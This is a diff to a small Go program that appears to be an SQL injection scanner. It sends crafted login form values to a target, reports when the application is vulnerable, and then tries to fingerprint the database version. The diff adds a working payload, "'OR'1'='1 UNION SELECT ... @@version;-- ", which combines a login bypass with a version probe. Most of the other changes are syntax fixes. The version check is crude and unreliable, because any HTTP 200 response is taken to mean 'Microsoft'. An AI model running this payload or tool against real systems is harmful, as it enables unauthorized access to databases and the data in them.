@@ -9,8 +9,8 @@ import (
 )
 
 type Database struct {
-	banner string
-	collected_data [] string
+	banner string;
+	collected_data []string;
 }
 
 func get_response(data url.Values) (int, string) {
@@ -23,9 +23,9 @@ func get_response(data url.Values) (int, string) {
 	if (err != nil) {
 		log.Fatal(err);
 	}
-	
-	return resp.StatusCode, string(body);	
-}	
+
+	return resp.StatusCode, string(body);
+}
 
 func check_sqli() bool {
 	data := url.Values {
@@ -59,14 +59,15 @@ func check_sqli() bool {
 	return false;
 }
 
-func get_version() {
+func get_version() string {
 	data := url.Values {
 		"username":		{"admin"},
-		"password":		{"test'; UNION SELECT 1,2,@@version;"},
+		"password":		{"test'OR'1'='1 UNION SELECT 1,2,@@version;-- "},
 	};
-	code, body = get_response(data);
-	if (code == 200 && (body != "")) {
-		fmt.println(body);
+	code, body := get_response(data);
+	if (code == 200) {
+		fmt.Println(body);
+		return "Microsoft"
 	}
 	return "Oracle";
 }
@@ -76,6 +77,7 @@ func main() {
 
 	if (vuln == true) {
 		fmt.Println("************APPLICATION IS VULNERABLE TO SQLi, VERSION TESTING***********");
-		var _type string = get_version()
+		var _type string = get_version();
+		fmt.Println(_type);
 	}
 }
